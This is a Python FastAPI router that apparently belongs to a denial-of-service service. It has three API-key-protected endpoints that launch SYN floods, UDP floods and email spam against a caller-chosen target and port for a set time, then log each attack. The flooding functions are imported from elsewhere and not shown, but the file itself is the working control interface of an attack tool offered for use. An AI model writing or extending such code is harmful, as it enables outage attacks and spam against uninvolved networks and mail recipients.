import json
from fastapi import APIRouter, Depends, Request, Response
from src.attack import Attack
from src.auth import verify_api_key
from src.controllers.attack_controller import attack_controller
from src.denialofservice.layer4 import Layer4
from src.log import log
from src.schemas import Layer4FloodRequest, EmailSpamRequest

layer4_router = APIRouter()


@layer4_router.post("/synflood")
async def syn_flood(syn_flood: Layer4FloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 4", "SYN-Flood", Layer4.syn_flood,
                        api_key, json.loads(syn_flood.json()))
        attack_controller.add_attack(attack)
        attack.start()
        log.info(
            f"{syn_flood.target}:{syn_flood.port} SYN-Flooded from {request.client.host} for {syn_flood.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{syn_flood.target}:{syn_flood.port} SYN-Flood from {request.client.host} for {syn_flood.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "SYN-Flood failed"}), media_type="application/json")


@layer4_router.post("/udpflood")
async def udp_flood(udp_flood: Layer4FloodRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 4", "UDP-Flood", Layer4.udp_flood,
                        api_key, json.loads(udp_flood.json()))
        attack_controller.add_attack(attack)
        attack.start()
        log.info(
            f"{udp_flood.target}:{udp_flood.port} UDP-Flooded from {request.client.host} for {udp_flood.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{udp_flood.target}:{udp_flood.port} UDP-Flood from {request.client.host} for {udp_flood.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "UDP-Flood failed"}), media_type="application/json")


@layer4_router.post("/emailspam")
async def email_spam(email_spam: EmailSpamRequest, request: Request, api_key_dependency: bool = Depends(verify_api_key)):
    try:
        api_key = request.headers.get("api-key")
        attack = Attack("Layer 4", "EMAIL-Spam", Layer4.email_spam,
                        api_key, json.loads(email_spam.json()))
        attack_controller.add_attack(attack)
        attack.start()
        log.info(
            f"{email_spam.target} EMAIL-Spammed from {request.client.host} for {email_spam.time} seconds")
        return Response(content=attack.get_status(), media_type="application/json", status_code=200)
    except:
        log.warning(
            f"{email_spam.target} EMAIL-Spam from {request.client.host} for {email_spam.time} seconds could not be triggered")
        return Response(status_code=500, content=json.dumps({"status": "EMAIL-Spam failed"}), media_type="application/json")
